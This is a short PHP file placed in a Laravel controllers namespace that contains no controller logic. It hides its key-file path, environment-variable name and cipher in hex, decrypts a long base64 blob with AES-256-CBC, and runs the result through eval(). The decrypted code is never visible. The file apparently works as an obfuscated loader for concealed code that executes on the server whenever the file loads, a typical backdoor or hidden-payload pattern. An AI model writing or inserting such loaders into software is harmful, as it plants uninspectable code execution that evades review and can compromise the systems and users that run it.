<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ig51nCmRNQyo5HdI0ZPfzQ==');

$c=base64_decode(

'aYs1iKv/JwL1+deJ7d0oAnul+Thloru1piOQxgWX0OkpD7O4NKAIFuVIvJ+Tgfj90uXyAWwaLzYG' .
'5soXwf5KudTllcPt6wdhCP1RJnmdVIo9VZlvY7v2Kp1jhf8KUB8F8HkQ8iIcb+obUB+1M85TIAUl' .
'B+Gs1VLVDP2oKS78TlpKj1QFwQXP7Zhk1OD5WPzBh6qXdGMVrZia1EZhb6XvFPSLH1i5NY8GlGGT' .
'kALCuotpQfiu6spvDFp6wwUWtpEDb//S5HPaJXb0VjgzNnEzZIYeXBeU3dEa1uNcdbMXS/BlXz0p' .
'u1z6baZUpI8Lc+JePz1yLrwd/dRqdxBlRte2Mpr0s1ozhZnmU4aN9Szc3ziYQh83ggLxDXUm7E8X' .
'CqQki3BRsVJSDNKQUGjntizbT2az9AAFqaCEZlovKU97oq6FP4XEaZSqMrJxmCOk/QGp8ol1FVMV' .
'xJNiEhg6WEClttjhdfRBSRg5B1U+POMoqoYEBFzHWI0WcpVrPj/t0lYOdtHCvZ8agSUdvDFQNW5P' .
'24nLo4SNy9aQEJndyu6Hvn+i5suchV7En4CqoiNsMkz+XHom3y/zwZse7PRTExpGxlGl9x6lsvBy' .
'vts6Rz50d0L5RqhGGDY+g7I+l+hVbh9I4Q6RfYgoymXIelMSVQTei93wERtFYDIW7vHIyid6HIcG' .
'hLgjkCTdCQZm9z4usRZgj6xOzEA2uOEvX1+qwv3UZCiImg7ChSS/P27p4v6vSE1o8nSmc8gGoM0j' .
'KZOaYPduuOUwtre82gE3MGF0bDPGzKbtcvrNtTfTrqeZl8VClQgZPpJXnnDfHD8EKsYMToXDqk8Q' .
'cIrBmf2UeX9t9tT+9/YLz9AF5GQ3Jp9qj+/4r/hIKuzhIC+T7k4+dme8m+4Jxx1ed4zkrISXqQTA' .
'X8og+uCwLaB8ZizcGTZj8mZ2QplxxdI5Be/KJpGTzVO+FtGDnPmYj6nTTrQq8XKLhNWzskiOfNqC' .
'KQwZ1nvFwLwSSDCpkVpvl/e7gdePbqggvcSzMvh1oJKvT1L0Lq5zjeLddG77+d+ScWIJYB11uym9' .
'c7liFacs0FpZekg1eKtCORSo+VQgEDt4wqZF2cwhOyUSdnnzgT8/970q/mlnJeGfZ270uz2c+8aB' .
'pHD6xq/2lGLJvtx5jHh1Pap3EYNkJvP6U5DxfZSqWK13emfWRpfzKyEmfDZ4QD2Lq+oiAHTPAxuC' .
'5coE0BMZWvUfVtLAkUKWqniahTSdGvkJiPU0ADd9PX+hXVutNpxKZtyKs8pIstVYnkmhj9Hlcueu' .
'4WWo/6yP+UgSNeR9Uaiq4hYg2j2JzOvdmYiVCfMa7saKJfMmix2Bs/iNu7RPQjHjvF/bybUU8rW+' .
'pmLkKCBZ+Az1IuSsq1/RrdwFzGnaD4/4tRx0Tgf6WY2povLQwj5Z+sDGo39ySxehNk/79gbTTaEi' .
'aWZyxyiCUxM/AGrolADmFw7edd4cWIyySrogCGxHFGDVvczTeiuekBc8FVdMbPSP8DX9WT2MglmP' .
'd3gmrJFFA2EjWasrlQKUSe+UlxwQ84+Ek77DAcYMQ7cdEyoYAZGk+9EtYym1x4BIFmTavTBcpinc' .
'L9JmFpAmFN4b/aBc5CWnmNADIImjfJq/HAZOgt7I3rTRQCTuSr9sbD3HbqDuxLXaD9sXUX4mh5zV' .
'342OaMbPZNhQOoQd/Ka3Ws85BbOqDgMBVCcJOc0L5lqTO/JaCH/LkIC/ISwVBmRzyxpQbzHzq2DH' .
'N5T1BU5iaRj14pkeMG1oEhTiYYmSJV7ZEmM2hpDpmftn53mLn1fCWXKgYKdzlG00e6e8PvWmsERf' .
'i6ALEktsMCRe8AJA3GzioxBhc/QYgs6HAPSs/5ooQh1AivrGQDI0RF8ff0u6yqKiPLyoe7j6BGAV' .
'mRT/6qK627hN3dhrNA1HArOG6VmZPvY3SOmZmMiil1r2eIz6AZcxU3q/yNHrDu/Ad/uMJn+3FIla' .
'7TaO0bvRkx60EHxI7u4pSkMlfgQqbwRFQmC4SW9q2cTTWv83L1xOgmetvEqCqV7sIAJczjJmUqZB' .
'9U4FD+HwKzUNsJW8JxCrTdozwzslpYKT+pyQIxN9RivfMsdVNzvTGAinoXNL0v60yveQefS+fGXo' .
'8U7z04MIU7egRUKuHTmFKv4syiLWWtN/JUuMJ/DxzjVdfY+d6B7yK/UV68wtvIwigi++zmM7hKwa' .
'vOZEFuYC6HKG3Ut3BZrPFgeNhFfhQN7IBk38VdptZP5GjquDmkFlmPSEGE17VpD4sHALsDYPrMrL' .
'i14G3UKLZkBD3QSYyBsWhHhfI4A2cHOu/1quWxUGHpVmLDNCxQzpmDvSIhrqaKDrEqG5hNCOpK1U' .
'iu7DCLy6MHbWMEqrEj60rYa+k1SF7M8/QXwKmmKXqeHDxn1uWRQfQcO3cST9T7mu05+d65yGh8Lf' .
'5p/z+zSw1L0QVR9HeejenwJPK59+UcstPBCBKkIcJWd4TE9pYWxQTHJinAN+7Nr6QARdQ2TJ0BOP' .
'KHYdSibn/Q=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

